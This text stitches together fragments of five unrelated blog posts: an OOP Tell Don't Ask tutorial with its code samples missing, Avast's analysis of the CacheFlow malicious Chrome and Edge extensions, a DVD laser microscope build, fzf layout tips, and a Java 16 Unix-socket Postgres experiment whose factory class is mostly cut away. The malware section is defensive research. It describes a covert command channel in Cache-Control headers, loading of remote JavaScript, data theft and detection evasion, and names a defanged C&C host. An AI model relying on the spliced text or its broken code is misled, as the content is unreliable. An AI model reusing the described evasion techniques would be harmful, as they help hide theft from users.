<ul><li>The localisation of information — everything related to the object will be kept in one place — its data, ways of modifying it, its flow and ways of processing it</li><li>Limited code duplication, as operations with objects data will be kept in one place. You will not have to keep an eye on DRY principle, as it will be implemented naturally</li><li>Strong <a href="https://pawelpluta.com/the-oop-has-been-explained-wrongly-to-me/">object-oriented approach</a>, with a focus on abstraction</li><li>Simplified unit tests. Instead of preparing heavy service classes to test data processing, most of your code could be tested with lightweight unit tests</li></ul>



<h2>A little bit of theory</h2>



<p>The Tell Don’t Ask is about <a href="https://martinfowler.com/bliki/TellDontAsk.html" target="_blank" rel="noopener">keeping the data where it belongs</a> – encapsulated inside the object. Encapsulation should prevent us from modifying object internal state without it knowing that. Modifying the object state with setter does not guarantee that, as such the object lacks abstraction. Service classes digging in objects internals are like trying to eat by putting food directly to your stomach, instead of putting the food into your mount.</p>



<p>Sample application used here will simulate a small farm, that has only a few responsibilities. The first task that it will fulfil is to water plants when they need that. The second will be gathering products from the plant, when they are ready, and the last one is to deliver packed products to the customer.</p>



<figure><img loading="lazy" width="1024" height="689" src="https://pawelpluta.com/wp-content/uploads/2021/01/Untitled-1024x689.png" alt="Diagram showing the interaction between service and classes that are violating OOP." srcset="https://pawelpluta.com/wp-content/uploads/2021/01/Untitled-1024x689.png 1024w, https://pawelpluta.com/wp-content/uploads/2021/01/Untitled-300x202.png 300w, https://pawelpluta.com/wp-content/uploads/2021/01/Untitled-768x517.png 768w, https://pawelpluta.com/wp-content/uploads/2021/01/Untitled.png 1102w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Sample service managing the data kept inside the objects.</figcaption></figure>



<p>With such an approach, we do not give objects any privacy. Tearing out their internals violates OOP and complicates the service logic. Let’s think how we can refactor it to obey Tell Don’t Ask principle and achieve clean code. Try to find the logic that has been taken out of classes. Spot for the places, where some decision is made. Found it? The first step would be to tell the <code>Plant</code> to water it using some <code>WaterValve</code>, instead of service doing that.</p>



<figure><img loading="lazy" width="862" height="602" src="https://pawelpluta.com/wp-content/uploads/2021/01/tellDontAskPlantRefactored.png" alt="Diagram showing the interaction between service and classes while using Tell Don't Ask Principle." srcset="https://pawelpluta.com/wp-content/uploads/2021/01/tellDontAskPlantRefactored.png 862w, https://pawelpluta.com/wp-content/uploads/2021/01/tellDontAskPlantRefactored-300x210.png 300w, https://pawelpluta.com/wp-content/uploads/2021/01/tellDontAskPlantRefactored-768x536.png 768w" sizes="(max-width: 862px) 100vw, 862px"><figcaption>Tell don’t ask principle used to refactor code to more object oriented one.</figcaption></figure>



<p>By telling the <code>Plant</code> to water it with some <code>WaterValve</code>, we encapsulated its logic inside the class. We do not need to make condition outside of the <code>Plant</code> class, which simplifies service testing by reducing the number of interactions between objects and possible execution paths. Let’s take a look into the practice.</p>



<h2>Modeling it in code</h2>



<p>Let’s look at the implementation that reflects the first diagram. It is digging deeply into objects internal, fetching plants from <code>RaisedBed</code> and getting internal properties from those plants. If that wasn’t enough, it is implementing plant-related logic, asking the plant for its values and setting new ones, depending on the <code>Plant</code> state. Service has huge knowledge about other object internals.</p>






<p>Sample service implementation that does not follow the Tell Don’t Ask principle.</p>



<p>Apart from asking for internal values, it also differentiates the logic depending on the type. Think a little bit about that, how you are going to test this solution? Are you going to check logic for every type of plant? Will you make different tests depending on plant soil moisture? What if there will be no raised bed or valve? Testing every possible path will require a lot of tests. Or, maybe you will decide risk bugs and not test everything?</p>



<h3>Getting hands dirty</h3>



<p>Consider the same service, but respecting the Tell Don’t Ask principle. Let’s literally tell the raised bed to be watered with some valve, and let it delegate this work to its plants.</p>






<p>Watering service after we applied the Tell Don’t Ask principle into it.</p>



<p>When we applied to Tell Don’t Ask principle, this service simply delegates the request to it. Its only responsibility is to orchestrate invocation and manage the repositories. Testing it will only limit to the integration with repositories, while logic that used to be in it can be checked easily with unit tests. You might struggle, where the logic is now? Take look on a part of refactored <code>RaisedBed</code>.</p>






<p>Again, using Tell Don’t Ask, we are not using the internals of <code>Plant</code> in here – we are only managing specific plant watering, but we let the plant to decide if it needs one. Again, there are not many cases to test in here, so writing unit test should be easy. Next step with this refactoring will be to include the watering logic inside the plant itself. You can consider introducing a Strategy pattern to simplify logic even more.</p>



<h2>Dealing with dependencies</h2>



<p>Sometimes, to perform an action, you will need to call another service. In our application, this is a situation when we sale products. Plants after gathering are organized into crates. Crates can be packed for the customer, and such a package can be sent to it. However, sending a package is managed by another service.</p>






<p>Service with dependent service usage without refactoring.</p>



<p>There are two most common approaches to refactor that into code obeying Tell Don’t Ask principle.</p>



<h3>Service orchestrating invocation</h3>



<p>First discussed approach relays on a service (<code>Sales</code> in this case), that has the knowledge about that when the <code>Package</code> should be sent. <code>Sales</code> service is an orchestrator for the process. In this case, we simply pass the package to delivery service so it will be processed by it.</p>






<p>Service orchestrating invocation of another service.</p>



<p>For most people, it is natural to code this way, so the benefit of this approach is the ease of understanding this solution. On the other hand, it creates a little bit of coupling between <code>Sales</code> service and a <code>Package</code> class – Sales does need to know when packaging was successful, and when it should be delivered.</p>



<h3>Disconnected Domain Model variation</h3>



<p>Disconnected Domain Model is was described in Vernon’s “Implementing Domain-Driven Design” book as a technique of injecting repositories into aggregates. Injecting repositories in every aggregate by constructor may cause problems with dependency injection mechanisms due to a large number of aggregates that should be fed with repository dependency. Instead of that, we might try to pass this dependency directly that need to use some service.</p>






<p><code>packageToDeliver.send()</code> requires <code>DeliveryService</code> to work.</p>



<p>This technique limits the knowledge of <code>Sales</code> service about <code>Package</code> class implementation, so it simplifies testing of a service. It keeps the whole logic related to <code>Package</code> inside class. On the other hand, it usually brings confusion to the developer, who is unfamiliar with it. While using this technique, carefully select services that are injected. Using those services only for invoking processing is usually not a threat, but using a value returned from injected service might lead to <a href="https://martinfowler.com/bliki/FlagArgument.html" target="_blank" rel="noopener">Flag Argument</a> antipattern.</p>



<h2>Summary</h2>



<p>The Tell Don’t Ask principle promotes keeping logic inside object instead of service. This increases their cohesion, making the code more maintainable and easier to test. Extracting the logic into service makes them unnecessarily big and complex. Try to speak with your objects, and tell them what to do.</p>



<h2>Code Kata</h2>



<p>If you feel, like you need some practice in adapting code according to Tell Don’t Ask principle, challenge yourself to do related <a rel="noreferrer noopener" href="https://github.com/pawelpluta/tell-dont-ask-kata" target="_blank">Code Kata</a>. You will find the description in the <a rel="noreferrer noopener" href="https://github.com/pawelpluta/tell-dont-ask-kata/blob/main/README.MD" target="_blank">Readme file</a>. Try to write as much as you can by yourself. There are some unit tests already written, but you will need much more of those. Sample solution can be found on <a rel="noreferrer noopener" href="https://github.com/pawelpluta/tell-dont-ask-kata/tree/sample-solution" target="_blank">this branch</a>, but remember, that it is just a sample, and there are multiple ways of doing it.</p>

<p>Chances are you are reading this blog post using your web browser. Chances also are your web browser has various extensions that provide additional functionality. We usually trust that the extensions installed from official browser stores are safe. But that is not always the case as we recently found.</p>



<p>This blog post brings more technical details on CacheFlow: a threat that we first <a href="https://blog.avast.com/malicious-browser-extensions-avast" target="_blank" rel="noreferrer noopener">reported</a> about in December 2020. We described a huge campaign composed of dozens of malicious Chrome and Edge browser extensions with more than three million installations in total. We alerted both Google and Microsoft about the presence of these malicious extensions on their respective extension stores and are happy to announce that both companies have since taken all of them down as of December 18, 2020.</p>



<p>CacheFlow was notable in particular for the way that the malicious extensions would try to hide their command and control traffic in a covert channel using the <code>Cache-Control</code> HTTP header of their analytics requests. We believe this is a new technique. In addition, it appears to us that the Google Analytics-style traffic was added not just to hide the malicious commands, but that the extension authors were also interested in the analytics requests themselves. We believe they tried to solve two problems, command and control and getting analytics information, with one solution.</p>



<p>We found that CacheFlow would carry out its attack in the following sequence:</p>



<div><figure><img loading="lazy" width="1024" height="497" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/CacheFlow-diagram-1024x497.jpg" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/CacheFlow-diagram-1024x497.jpg 1024w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/CacheFlow-diagram-300x146.jpg 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/CacheFlow-diagram-768x373.jpg 768w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/CacheFlow-diagram-1536x746.jpg 1536w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/CacheFlow-diagram-2048x994.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>High-level overview of the CacheFlow malware</figcaption></figure></div>



<p>Based on our telemetry, the top three countries where Avast users downloaded and installed the CacheFlow extensions were Brazil, Ukraine, and France.</p>

<p>We initially learned about this campaign by reading a <a href="https://blog.nic.cz/2020/11/19/hledani-skodliveho-kodu-mezi-doplnky/" target="_blank" rel="noreferrer noopener">Czech blog post by Edvard Rejthar from CZ.NIC</a>. He discovered that the Chrome extension “Video Downloader for FaceBook™” (ID <code>pfnmibjifkhhblmdmaocfohebdpfppkf</code>) was stealthily loading an obfuscated piece of JavaScript that had nothing to do with the extension’s advertised functionality. Continuing from his findings, we managed to find many other extensions that were doing the same thing. These other extensions offered various legitimate functionality, with many of them being video downloaders for popular social media platforms. After reverse engineering the obfuscated JavaScript, we found that the main malicious payload delivered by these extensions was responsible for malicious browser redirects. Not only that, but the cybercriminals were also collecting quite a lot of data about the users of the malicious extensions, such as all of their search engine queries or information about everything they clicked on.</p>



<p>The extensions exhibited quite a high level of sneakiness by employing many tricks to lower the chances of detection. First of all, they avoided infecting users who were likely to be web developers. They determined this either through the extensions the user had installed or by checking if the user accessed locally-hosted websites. Furthermore, the extensions delayed their malicious activity for at least three days after installation to avoid raising red flags early on. When the malware detected that the browser developer tools were opened, it would immediately deactivate its malicious functionality. CacheFlow also checked every Google search query and if the user was googling for one of the malware’s command and control (C&amp;C) domains, it reported this to its C&amp;C server and could deactivate itself as well.</p>



<p>According to user reviews on the Chrome Web Store, it seems that CacheFlow was active since at least October 2017. All of the stealthiness described above could explain why it stayed undetected for so long.</p>



<div><figure><img loading="lazy" width="913" height="165" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/store_review_2017.png" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/store_review_2017.png 913w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/store_review_2017-300x54.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/store_review_2017-768x139.png 768w" sizes="(max-width: 913px) 100vw, 913px"><figcaption>User review on the Chrome Web Store from October 2017 that mentions modification of Google search results</figcaption></figure></div>







<h2>The covert channel</h2>



<p>First, we’ll show the hidden backdoor that the extensions used to download and execute arbitrary JavaScript. Specifically, we’ll describe the backdoor from the Chrome extension “Downloader for Instagram” v5.7.3 (ID <code>olkpikmlhoaojbbmmpejnimiglejmboe</code>), but this analysis applies to the other extensions as well, since the malicious code hidden in them is very similar in functionality.</p>



<div><figure><img src="https://lh5.googleusercontent.com/DErNJa7s3X7-EUGOvCPpQEsJkAFH3KdRvBFxQiWH37NiSAKIUFvxmKssQ6m0i5zTskNWTeV8pfeCj7secZzSG2uckKlFTISyB4r1PwuDMYvf5CkgITiXM_V2UR3QYIZsSElCeuDm" alt=""><figcaption>“Downloader for Instagram” page on the Chrome Web Store</figcaption></figure></div>



<p>It is generally a good idea to start the analysis of unknown Chrome extensions from the <code>manifest.json</code> file. The manifest of “Downloader for Instagram” gives us some interesting pieces of information.</p>



<p>First of all, the <code>content_security_policy</code> is defined in such a way that it is possible to use the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#never_use_eval!" target="_blank" rel="noreferrer noopener">infamous</a> <code>eval</code> function to load additional JavaScript. However, looking for the string <code>eval</code> in the extension’s source code did not yield any interesting results. As we’ll show later, the extension does use the <code>eval</code> function quite a lot, but it hides its usage, so it is not immediately apparent.</p>



<div><figure><img src="https://lh4.googleusercontent.com/plYZi8H7ohhbAAGn3HoHfsRhaKu0FOSM27Fk6aINue25-LuOKNcgZHVJBIEY8-YtNffVboZryyjaWPgSQqa7HdiL5QBnjdulWfjr30YwBNTzaI8bBoaRSZiFyDpVWMF10DOf6mnI" alt=""><figcaption>Content Security Policy definition from the <code>manifest.json</code> file</figcaption></figure></div>



<p>Secondly, the extension asks for quite a lot of permissions and it is not immediately clear why these permissions would be needed to download videos from Instagram. Especially interesting is the <code>management</code> permission, which allows the extension to control other extensions. The combination of the <code>webRequest</code> and the <code>&lt;all_urls&gt;</code> permissions is also interesting. Together, these two permissions make it possible for the extension to intercept pretty much any web request coming from the browser.</p>



<div><figure><img src="https://lh6.googleusercontent.com/GXlvV4yTGeWbiZn6q7WjmNOfxq-jQx8pYbqFCwcgLU8Li3I_i8_YQ7C-QXdSMBm03-LaGuk-ZhkVbn15nD0UZ2a7BFYaSdFAIsXPTbGmn4rFZRXpgDn3cyBZBwS8oVq07i6NnetY" alt=""><figcaption>Permissions requested by the malicious extensions</figcaption></figure></div>



<p>Finally, the manifest defines two background scripts: <code>js/jquery.js</code> and <code>js/background.js</code>. These scripts are persistent, which means that they will keep running unless the extension gets disabled.</p>



<div><figure><img src="https://lh6.googleusercontent.com/tflzmxXmCyqagTiUbTkHb7DfNI4It30R0hHDVjZh7WeAiV-bl4f6ve33LXphmm84N9kO_epPU1iIhI2S0vE6powG9jB5ufNMJ1ima-gEKgVyZx-_8RbfQyzCXaiPExZqMsDfpO-i" alt=""><figcaption>Background scripts declared in the <code>manifest.json</code> file</figcaption></figure></div>



<p>One of these background scripts, <code>background.js</code>, is where the suspicious <code>webRequest</code> API is used. This script accesses the HTTP response headers of all intercepted web requests and stores their values in localStorage.</p>



<div><figure><img src="https://lh6.googleusercontent.com/kB_RAWUKhE4467ei82a1zl_u6pXyfB5eEtzfXI_kjFMKqXSWGjk9VHbNsndNB-EesAb3yZAUFy7nGr4jQPK3Ok7BTwm9Iih-eGXzFqVV7gBiPxdBb2ZSzNAlxjzFviBWDSJOAht3" alt=""><figcaption>CacheFlow saves the values of all sufficiently long HTTP response headers into localStorage.</figcaption></figure></div>



<p>The content of localStorage is then read by the other persistent malicious background script: <code>jquery.js</code>. While this script appears at first glance to be the legitimate <a href="https://jquery.com/" target="_blank" rel="noreferrer noopener">jQuery</a> library, some additional functions were inserted into it. One of those additional functions is misleadingly named <code>parseRelative</code>, while all it does is return the <code>window.localStorage</code> object.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/TeINLg0HORJ_P0DDJbaEsBs_cz5hA2fDGSSb6orJ76THL7JKjxYj1UOj-Atkn89kjg1Zfmk6tQTL-LzlneXJh4Kj1MizzyCDh66jonO8tMc3EL-sNA3dNyBLmcNTbNEOPxAumWKi" alt=""><figcaption>Misleadingly named <code>parseRelative</code> function hidden inside <code>jquery.js</code></figcaption></figure></div>



<p>Another inserted and misleadingly named function is <code>initAjax</code>.</p>



<div><figure><img loading="lazy" width="1006" height="456" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/initAjax.png" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/initAjax.png 1006w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/initAjax-300x136.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/initAjax-768x348.png 768w" sizes="(max-width: 1006px) 100vw, 1006px"><figcaption><code>initAjax</code> function decodes the content of <code>localStorage['cache-control']</code> and stores decoded values in the <code>window</code> object.&nbsp;</figcaption></figure></div>



<p>This function is particularly interested in the content of <code>localStorage['cache-control']</code>, which should at this point be set to the value of the last received <code>Cache-Control</code> HTTP response header. The function splits the content of this header with a comma and attempts to decrypt each part using a custom function named <code>strrevsstr</code>, before finally parsing it out as a JSON string.</p>



<div><figure><img src="https://lh3.googleusercontent.com/goWFLSGQb0chknR4jrq9RWhhwgku6ms3lXOQy7Ix-n7YM9WsmAzRZ4OonUGJV6Pm6pmt_NHOYeSKEDdyuYt029lAhBsR6fy3VNkgJu0UU25TSAnMZpAAOpmuVfPsRzkfySTLJSI3" alt=""><figcaption><code>strrevsstr</code> function used by the extension to decrypt strings</figcaption></figure></div>



<p>The obvious question now is why would the extension expect to intercept requests that contain an encrypted JSON string in the <code>Cache-Control</code> response header?&nbsp;</p>



<p>The answer is that the threat actors are using the content of the <code>Cache-Control</code> header as a covert channel to send hidden commands to the malicious extension.&nbsp;</p>



<p>As a part of the malicious extension’s regular functionality, analytics requests about some events are sent to <code>https://stats.script-protection[.]com/__utm.gif</code>. These are standard analytics requests that bear resemblance to Google Analytics. The catch is, that the server used by this extension might respond to the analytics requests with a specially formed <code>Cache-Control</code> header, which the client will decrypt, parse out and execute.</p>



<div><figure><img src="https://lh6.googleusercontent.com/ght_jCWk0nzs16njkDqf6SCrXlE7Va4Y_BLXzs8w8lgJXRnxFDgZa60VirwgiZ421w7dZwBnQAw-jOAvvy8A_PAborsR8hTg5fmWhtTFHK2PVDHWFF58lDRprGqhnYzibiN2FV_4" alt=""><figcaption>Flow of the covert channel</figcaption></figure></div>



<p>To see what the commands could look like, we simulated the extension and sent a fake analytics HTTP request to <code>https://stats.script-protection[.]com/__utm.gif</code>. After a couple of attempts, we received a specially crafted <code>Cache-Control</code> header.</p>



<div><figure><img src="https://lh3.googleusercontent.com/evazuvvQ91jdK50XsV34gbeOAkRH_vJz6mptWRlJtBgQQbyK-JOEPrAsshMkMLZdHcxZUJORtwLANqhWO1e6W_QLMx1K2e5JNi6rg9zDYr2n7IK_beX5bKLYfJDobQyfe2hy9o7G" alt=""><figcaption>Fiddler capture of a seemingly innocent analytics request that contains a hidden command in the <code>Cache-Control</code> response header</figcaption></figure></div>



<p>Note that the response will contain the encoded command only when some conditions are met. First of all, the GET parameter <code>it</code> has to be set at least three days into the past. Since this parameter contains the time when the extension was installed, this effectively ensures that the extension will not exhibit any malicious behavior during the first three days. There is also a check based on the IP address, since we repeatedly did not receive any commands from one source IP address, even though we did receive a command for the same GET request from another IP address. As the logic behind these checks is safely hidden on the C&amp;C server, there might be additional checks that we are not aware of.</p>



<p>When the content of the received <code>Cache-Control</code> header is <a href="https://github.com/avast/ioc/blob/master/CacheFlow/extras/decryptor_strrevsstr.py" target="_blank" rel="noreferrer noopener">decoded</a> using the custom <code>strrevsstr</code> function as outlined above, we get the command in the following JSON. As was seen in the <code>initAjax</code> function, all of the attributes from this JSON get stored in the global <code>window</code> object.</p>



<div><figure><img loading="lazy" width="642" height="134" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/json_command-1.png" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/json_command-1.png 642w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/02/json_command-1-300x63.png 300w" sizes="(max-width: 642px) 100vw, 642px"><figcaption>Command decoded from the <code>Cache-Control</code> response header</figcaption></figure></div>



<p>Upon receiving such a command, the extension downloads the second stage from <code>command['uu']</code> in a function named <code>siblingAfter</code>, which is also hidden inside <code>jquery.js</code>. The dollar sign from <code>command['jj']</code> here represents the <code>jQuery</code> object, so the function uses the <code>jQuery.get</code> function to download the next stage from <code>command['uu']</code> and to store it in <code>localStorage.dataDefault</code>.</p>

					<p>The laser scanning microscope is a special light microscope which uses a focused laser beam to scans the sample. The scanning of the laser across the sample is done by driving the laser in x and y direction.&nbsp; The image is composed in the software by combining the measured light points.</p>
<p>The DVD Laser Scanner Microscope is build from two DVD pick-up heads. The laser of the DVD head is used to illuminate the sample at a tiny spot, focused with the DVD heads own focusing mechanism. The deviation of the laser is done by the pick-up heads lens moving coils.</p>

<h6>Confocal Fluorescence Microscopy</h6>
<p>A special case is the confocal laser scanning microscopy that enables the reconstruction of three-dimensional structures from sets of images obtained at different depths. Confocal laser scanning microscopes are often used in combination with fluorescence to study properties of biological samples such as cells.</p>

<h6>Image Resolution</h6>
<p>The resolution of the image is defined by the number of measurements taken in x direction and the number of lines in y. The maximum resolution is limited by the numerical aperture of the system’s objective lens and the wavelength of the laser as in conventional optical microscopes. In fluorescence observations, the resolution is often limited by the strength of the signal. More sensitive photo-detectors or increasing the intensity of the illuminating laser can compensate.</p>

<h6>Prototype Setup</h6>
<p>The first prototype set-up uses two pick-up head. One is emitting the laser and scanning in x direction. The second pick-up head carries the sample and moves in y direction. The photo-detector on the laser unit is removed and the signal is captured with a simple photo-diode. The coils are controlled by an <a href="https://www.arduino.cc/en/Main/ArduinoBoardUno">Arduino</a> with drive electronics and the images is rendered in <a href="https://processing.org/">Processing</a>.</p>

  <div itemprop="articleBody">
    <p><em>Here’s what I learned from reading the first part of the fzf README and paying attention. Now I have a better setup and understanding of the basics, and in particular how to control the appearance.</em></p>

<p>In the context of <a href="https://qmacro.org/2021/02/01/do-less-and-do-it-better/">doing less and doing it better</a> I decided to start learning more about <a href="https://github.com/junegunn/fzf"><code>fzf</code></a>, the “command line fuzzy finder”. Learning more wasn’t difficult, because despite using it for quite a while, I’ve never really read any of the documentation, and have thus only scratched its surface.</p>

<p>So I started with the first part of the main <a href="https://github.com/junegunn/fzf/blob/master/README.md">README</a>, and here’s what I found.</p>

<p>The examples I give in this post are taken from a directory and file structure reflecting the <a href="https://github.com/SAP-samples/teched2020-developer-keynote">SAP TechEd 2020 Developer Keynote repository</a>, which has multiple directories and subdirectories, lots of files with different extensions, hidden files and directories (and I’m not just talking about the <code>.git/</code> directory) and also stuff that we often want excluded, such as any <code>node_modules/</code> directories. Fairly representative and useful for illustration.</p>

<p><strong>An awareness of new and changed features</strong></p>

<p>I was using an older version of <code>fzf</code> because I hadn’t upgraded it; a quick <code>brew update; brew upgrade fzf</code> later and I was using the <a href="https://github.com/junegunn/fzf/releases/tag/0.25.0">latest release</a>. Not absolutely essential for me, but doing this makes me more aware of the fact that fixes and features do come along, and also exposes me to options that I might not have known about. So an indirect but useful advantage already.</p>

<p>I’d <a href="https://github.com/qmacro/dotfiles/commit/68f3c40a76ddd2d8c5c08463855a59ed0e6d7c74#diff-53370cdb3bc79473f0579d40685f8516cc93a2c60b4382e60cb94c09d0c2bfc2R1">already installed the keybindings</a> keybindings (to get <code>fzf</code> to react on Ctrl-T and Ctrl-C) so that was still OK.</p>

<p><strong>Basic navigation</strong></p>

<p>I’d been using the arrow keys to move up and down in the list that <code>fzf</code> presents. The shame of it! Now I’ve learned that I can use Vim style key bindings to move up (Ctrl-J) and down (Ctrl-K) I feel less unclean. There’s even support for the mousewheel, but the less said about that the better.</p>

<p>Anyway, it’s time to get to the main topic of this post - how to affect <code>fzf</code>’s appearance, or layout.</p>

<p><strong>Layout</strong></p>

<p>Out of the box, <code>fzf</code> will use the entire height of your current terminal to display the choices, and this is more or less how I’ve mostly used <code>fzf</code> thus far:</p>



<p>But it doesn’t have to be this way; in the Layout category of options there’s <code>--height</code> with which you can tell <code>fzf</code> only to use a certain percentage of the terminal’s height.</p>



<p>Moreover, the jump from the line I was on when <code>fzf</code> was invoked, down to the bottom of the screen where I was to make my choice, was a little jarring for me.</p>

<p>I’d vaguely (but mistakenly) thought that the <code>--layout=reverse</code> option, also in the Layout category, was something to do with the sort order of the choices presented. Turns out that the order can be reversed with the <code>--tac</code> option (taken from the name of <code>tac</code>, a command independent of <code>fzf</code>, whose name is the opposite of <code>cat</code>, see?) and that the <code>--layout=reverse</code> relates to the general presentation of the choices.</p>

<p>So with <code>--layout=reverse</code> I can reduce that jarring by having the place where I make my choice at the top of the list rather than at the bottom, like this:</p>



<p>There’s a couple of other options that I found that made the appearance even better for me, but these are more subjective.</p>

<p>First, I can get a border around everything with the Layout option <code>--border</code>. In fact there are multiple values that can be specified for this option; the default is to make a rounded border around all four sides.</p>

<p>Then I can save a bit of space by specifying the value <code>inline</code> for the <code>--info</code> option, also in the Layout category, to get the stats displayed on the same line as my input.</p>

<p>Here’s both of those options in action:</p>



<blockquote>
  <p>In this and the next asciicast, the right hand edge of the border is not properly displayed or reproduced in asciinema for some reason; just imagine that the options are nicely boxed all the way around.</p>
</blockquote>

<p>Before we leave the Layout category, there’s a couple of other options that can give a nice effect, especially for making <a href="https://tools.suckless.org/dmenu/"><code>dmenu</code></a> or <a href="https://github.com/davatorium/rofi"><code>rofi</code></a> style popup menus. These are <code>--margin</code> and <code>--padding</code>. I’ve found that to get a popup menu effect, it’s worth leaving off the height option (<code>--height</code>) to get full screen:</p>



<p><strong>Next time</strong></p>

<p>That’s about it for what I’ve learned about controlling the appearance. There’s actually plenty more on this in the <a href="https://github.com/junegunn/fzf/wiki">wiki</a>.</p>

<p>Note right now that there are 17688 entries in the list of choices presented to me. That’s a lot, and far more than I’d ever actually want to select from. Next time I’ll take a look at a couple of <code>fzf</code> environment variables, one of which controls what command <code>fzf</code> uses, and how that can be changed to affect what gets displayed (or not displayed) in the choice list, so I can address that large number of entries issue.</p>

			<div>
				
<p>Reading a blog post about what’s <a href="https://www.loicmathieu.fr/wordpress/en/informatique/java-16-quoi-de-neuf/">coming up in JDK 16</a> recently,
I learned that one of the new features is support for Unix domain sockets (<a href="https://openjdk.java.net/jeps/380">JEP 380</a>).
Before Java 16, you’d have to resort to 3rd party libraries like <a href="https://github.com/jnr/jnr-unixsocket">jnr-unixsocket</a> in order to use them.
If you haven’t heard about <a href="https://en.wikipedia.org/wiki/Unix_domain_socket">Unix domain sockets</a> before,
they are "data communications [endpoints] for exchanging data between processes executing on the same host operating system".
Don’t be put off by the name btw.;
Unix domain sockets are also supported by macOS and even Windows since <a href="https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/">version 10</a>.</p>
<p>Databases such as Postgres or MySQL use them for offering an alternative to TCP/IP-based connections to client applications running on the same machine as the database.
In such scenario,
Unix domain sockets are both more secure
(no remote access to the database is exposed at all; file system permissions can be used for access control),
and also <a href="https://momjian.us/main/blogs/pgblog/2012.html#June_6_2012">more efficient</a> than TCP/IP loopback connections.</p>
<p>A common use case are proxies for accessing Cloud-based databases,
such as as the GCP <a href="https://cloud.google.com/sql/docs/mysql/sql-proxy#proxy_startup_options">Cloud SQL Proxy</a>.
Running on the same machine as a client application
(e.g. in a sidecar container in case of Kubernetes deployments),
they provide secure access to a managed database, for instance taking care of the SSL handling.</p>
<p>My curiousity was piqued and I was wondering what it’d take to make use of the new Java 16 Unix domain socket for connecting to Postgres.
It was your regular evening during the pandemic,
without much to do, so I thought "Let’s give this a try".
To have a testing bed, I started with installing Postgres 13 on Fedora 33.
Fedora might not always have the latest Postgres version packaged just yet,
but following the official <a href="https://www.postgresql.org/download/linux/redhat/">Postgres instructions</a> it is straight-forward to install newer versions.</p>
<p>In order to connect with user name and password via a Unix domain socket,
one small adjustment to <em>/var/lib/pgsql/13/data/pg_hba.conf</em> is needed:
the access <code>method</code> for the <code>local</code> connection type must be switched from the default value <code>peer</code>
(which would try to authenticate using the operating system user name of the client process) to <code>md5</code>.</p>
<div>
<div>
<pre><code>...
# TYPE  DATABASE        USER            ADDRESS                 METHOD
# "local" is for Unix domain socket connections only
local   all             all                                     md5
...</code></pre>
</div>
</div>
<p>Make sure to apply the changed configuration by restarting the database
(<code>systemctl restart postgresql-13</code>),
and things are ready to go.</p>
<div>
<h2 id="_the_postgres_jdbc_driver">The Postgres JDBC Driver</h2>
<div>
<p>The first thing I looked into was the Postgres <a href="https://jdbc.postgresql.org/">JDBC driver</a>.
Since version <a href="https://jdbc.postgresql.org/documentation/changelog.html#version_9.4-1208">9.4-1208</a> (released in 2016) it allows you to configure custom socket factories,
a feature which explicitly was added considering Unix domain sockets.
The driver itself doesn’t come with a socket factory implementation that’d actually support Unix domain sockets,
but a few external open-source implementations exist.
Most notably junixsocket provides such <a href="https://kohlschutter.github.io/junixsocket/dependency.html#PostgreSQL">socket factory</a>.</p>
<p>Custom socket factories must extend <code>javax.net.SocketFactory</code>,
and their fully-qualified class name needs to be specified using the <a href="https://jdbc.postgresql.org/documentation/head/connect.html#unix%20sockets">socketFactory</a> driver parameter.
So it should be easy to create <code>SocketFactory</code> implementation based on the new <a href="https://download.java.net/java/early_access/jdk16/docs/api/java.base/java/net/UnixDomainSocketAddress.html">UnixDomainSocketAddress</a> class, right?</p>
<div>
<div>
<pre><code data-lang="java"><span>public</span> <span>class</span> <span>PostgresUnixDomainSocketFactory</span> <span>extends</span> <span>SocketFactory</span> <span>{</span>

    <span>return</span> <span>socket</span><span>;</span>
  <span>}</span>

  <span>// other create methods ...</span>
<span>}</span></code></pre>
</div>
</div>
<div>
<table>
<tbody><tr>
<td><i data-value="1"></i><b>1</b></td>
<td>Create a Unix domain socket address for the default path of the socket on Fedora and related systems</td>
</tr>
</tbody></table>
</div>
<p>It compiles just fine;
but it turns out not all socket addresses are equal,
and <code>java.net.Socket</code> only connects to addresses of type <code>InetSocketAddress</code>
(and the PG driver maintainers seem to sense some air of mystery around these "unusual" events, too):</p>
<div>
<div>
<pre><code>org.postgresql.util.PSQLException: Something unusual has occurred to cause the driver to fail. Please report this exception.
  at org.postgresql.Driver.connect(Driver.java:285)
  ...

Caused by:
java.lang.IllegalArgumentException: Unsupported address type
  at java.base/java.net.Socket.connect(Socket.java:629)

  at dev.morling.demos.PostgresUnixDomainSocketFactory.createSocket(PostgresUnixDomainSocketFactory.java:19)
  ...</code></pre>
</div>
</div>
<p>Now JEP 380 solely speaks about <code>SocketChannel</code> and stays silent about <code>Socket</code>;
but perhaps obtaining a socket from a domain socket channel works?</p>
<div>
<div>
<pre><code data-lang="java"><span>public</span> <span>Socket</span> <span>createSocket</span><span>()</span> <span>throws</span> <span>IOException</span> <span>{</span>
  <span>var</span> <span>sc</span> <span>=</span> <span>SocketChannel</span><span>.</span><span>open</span><span>(</span><span>UnixDomainSocketAddress</span><span>.</span><span>of</span><span>(</span>
      <span>"/var/run/postgresql/.s.PGSQL.5432"</span><span>));</span>
  <span>return</span> <span>sc</span><span>.</span><span>socket</span><span>();</span>
<span>}</span></code></pre>
</div>
</div>
<p>Nope, no luck either:</p>
